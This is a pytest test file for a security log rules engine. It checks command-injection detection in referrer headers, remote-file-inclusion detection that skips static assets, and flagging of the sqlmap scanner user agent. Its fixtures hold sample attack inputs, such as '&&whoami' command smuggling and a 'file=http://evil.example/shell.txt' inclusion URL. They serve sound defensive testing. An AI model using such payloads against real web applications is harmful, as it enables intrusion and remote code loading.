from __future__ import annotations

from datetime import datetime
from uuid import uuid4

from rules_engine.rules_bot_cve import KnownScannerUARule
from rules_engine.rules_injection import CommandInjectionRule
from rules_engine.rules_recon import RFIRule
from shared_models.events import EventAction, NetworkProtocol, NormalizedEvent


def make_event(
    *,
    src_ip: str = "8.8.8.8",
    raw_url: str = "/",
    http_status: int = 200,
    user_agent: str = "Mozilla/5.0",
    referrer: str | None = None,
    original_message: str | None = None,
) -> NormalizedEvent:
    return NormalizedEvent(
        event_id=uuid4(),
        file_id=uuid4(),
        row_hash=str(uuid4()).replace("-", "")[:16],
        timestamp=datetime(2026, 5, 20, 12, 0, 0),
        src_ip=src_ip,
        dst_ip="203.0.113.10",
        dst_port=443,
        action=EventAction.ALLOW,
        protocol=NetworkProtocol.HTTPS,
        http_method="GET",
        http_status=http_status,
        raw_url=raw_url,
        uri_path=raw_url.split("?", 1)[0],
        user_agent=user_agent,
        referrer=referrer,
        original_message=original_message,
    )


def test_command_injection_checks_httpreferer_not_original_message() -> None:
    rule = CommandInjectionRule()

    original_message_only = make_event(original_message="x && whoami")
    assert rule.match(original_message_only) is None

    referer_hit = make_event(referrer="https://example.test/?x=1&&whoami")
    match = rule.match(referer_hit)
    assert match is not None
    assert match.matched_field == "httpreferer"


def test_rfi_excludes_static_content_extensions() -> None:
    static_hit = make_event(
        raw_url="/assets/app.js?file=http://evil.example/shell.txt",
        user_agent="Mozilla/5.0",
    )
    dynamic_hit = make_event(
        raw_url="/view?file=http://evil.example/shell.txt",
        user_agent="Mozilla/5.0",
    )

    static_matches = RFIRule.check_batch([static_hit])
    dynamic_matches = RFIRule.check_batch([dynamic_hit])

    assert static_matches == []
    assert [match.rule_name for match in dynamic_matches] == ["rfi_raw_protocol"]


def test_known_scanner_ua_requires_public_non_zscaler_2xx(monkeypatch) -> None:
    monkeypatch.setattr("rules_engine.rules_bot_cve.is_zscaler_ip", lambda ip: ip == "45.249.218.12")
    rule = KnownScannerUARule()

    assert rule.match(make_event(src_ip="8.8.8.8", http_status=200, user_agent="sqlmap/1.7")) is not None
    assert rule.match(make_event(src_ip="8.8.8.8", http_status=404, user_agent="sqlmap/1.7")) is None
    assert rule.match(make_event(src_ip="10.0.0.10", http_status=200, user_agent="sqlmap/1.7")) is None
    assert rule.match(make_event(src_ip="45.249.218.12", http_status=200, user_agent="sqlmap/1.7")) is None
